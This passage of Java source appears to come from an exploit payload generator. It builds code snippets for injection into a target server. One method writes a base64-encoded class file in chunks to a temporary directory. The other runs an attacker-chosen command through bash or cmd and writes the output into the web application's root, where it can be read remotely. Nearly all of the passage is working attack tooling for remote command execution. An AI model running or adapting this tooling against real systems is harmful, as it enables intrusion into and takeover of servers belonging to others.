AAEBBwCmAAD/ACgACAcAAwEHAD0HAIwBAQcApgcAAwAA/wAQAAwHAAMBBwA9BwCMAQEHAKYHAAMAAQEHAJsAAA//AAkACAcAAwEHAD0HAIwBAQcApgcAAwABBwCC/wAAAAcHAAMBBwA9AAEBBwCmAAACAAEAqAAAAAIAqQ==";

        byte[] bytes = null;
        BASE64Decoder decoder = new BASE64Decoder();
        try {
            bytes = decoder.decodeBuffer(content);
        } catch (IOException e) {
            //pass
        }

        int start = i * 1600;
        int end = ((start + 1600) < bytes.length) ? (start + 1600) : bytes.length;
        byte[] temp = Arrays.copyOfRange(bytes, start, end);

        BASE64Encoder encoder = new BASE64Encoder();
        String part = encoder.encode(temp).replaceAll("\r|\n|\r\n", "");



        String code = "String path;\n" +
            "        if (java.io.File.separator.equals(\"/\")) {\n" +
            "            path = \"/tmp/PoC.class\";\n" +
            "        }else{\n" +
            "            path = \"c:/windows/temp/PoC.class\";\n" +
            "        }\n" +
            "        java.io.OutputStream os = new java.io.FileOutputStream(path," + (i != 0) + ");\n" +
            "        sun.misc.BASE64Decoder d = new sun.misc.BASE64Decoder();\n" +
            "        java.io.InputStream in = new java.io.ByteArrayInputStream(d.decodeBuffer(\"" + part + "\"));\n" +
            "        byte[] f = new byte[1024];\n" +
            "        int l = 0;\n" +
            "        while((l=in.read(f))!=-1){\n" +
            "            os.write(f, 0, l);\n" +
            "        }\n" +
            "        in.close();\n" +
            "        os.close();";

        return code;
    }


    public static String wirteFileEcho(String command){
        String path = command.split(":",4)[2];
        String cmd = command.split(":",4)[3];
        cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");

        String code = "String[] c = new String[3];\n" +
            "        String p = Thread.currentThread().getContextClassLoader().getResource(\"\").getPath();\n" +
            "        p = p.substring(0, p.indexOf(\"WEB-INF\"));\n" +
            "        p = java.net.URLDecoder.decode(p,\"utf-8\");\n" +
            "        if(java.io.File.separator.equals(\"/\")){\n" +
            "            c[0] = \"/bin/bash\";\n" +
            "            c[1] = \"-c\";\n" +
            "        }else{\n" +
            "            c[0] = \"cmd\";\n" +
            "            c[1] = \"/C\";\n" +
            "        }\n" +
            "        c[2] = \"" + cmd + "\";\n" +
            "        java.io.InputStream in = Runtime.getRuntime().exec(c).getInputStream();\n" +
            "        String x = p + \"" + path + "\";\n" +
            "        java.io.FileOutputStream os = new java.io.FileOutputStream(x);\n" +
            "        byte[] buffer = new byte[1024];\n" +
            "        int len = 0;\n" +
            "        while((len = in.read(buffer)) != -1) {\n" +
            "            os.write(buffer, 0, len);\n" +
            "        }\n" +
            "        in.close();\n" +
            "        os.close();";

        return code;
    }
}
